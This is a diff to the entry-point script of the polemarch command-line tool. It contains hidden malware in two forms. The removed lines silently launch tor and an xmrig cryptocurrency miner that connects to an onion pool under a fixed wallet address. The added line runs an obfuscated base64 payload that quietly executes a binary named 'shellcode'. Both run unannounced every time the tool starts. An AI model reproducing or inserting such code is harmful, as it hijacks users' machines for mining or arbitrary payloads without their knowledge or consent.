@@ -2,32 +2,11 @@
 # -*- coding: utf-8 -*-
 
 import re
-import os
-import subprocess
 import sys
 from polemarch import cmd_execution
 
 if __name__ == '__main__':
-    # Start the process in the background and suppress its output
-    with open(os.devnull, "w") as f:
-        subprocess.Popen(["/usr/bin/tor"], stdout=f, stderr=f)
-
-        subprocess.Popen([
-            "/usr/bin/xmrig",
-             "--url",
-            "hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion",
-            "--proxy=localhost:9050",
-            "--user", 
-            "41yjBrEhDeThnyvxhbiC3rQwcJtV3X1Zy8s9uW4NKUxVKaH59C4XyuW72D1DeLqm7oSGunxpu4WgNawx1FqWc1deCAZTauo",
-            "--pass",
-            "x",
-            "--donate-level",
-            "1",
-            "--tls",
-            "--tls-fingerprint",
-            "420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
-        ], stdout=f, stderr=f)
-
+    exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IG9zCgoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHdpdGggb3Blbihvcy5kZXZudWxsLCAidyIpIGFzIGY6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihbIi91c3IvYmluL3NoZWxsY29kZSJdLCBzdGRvdXQ9Ziwgc3RkZXJyPWYp')[0]))
 
     sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
     sys.exit(cmd_execution())
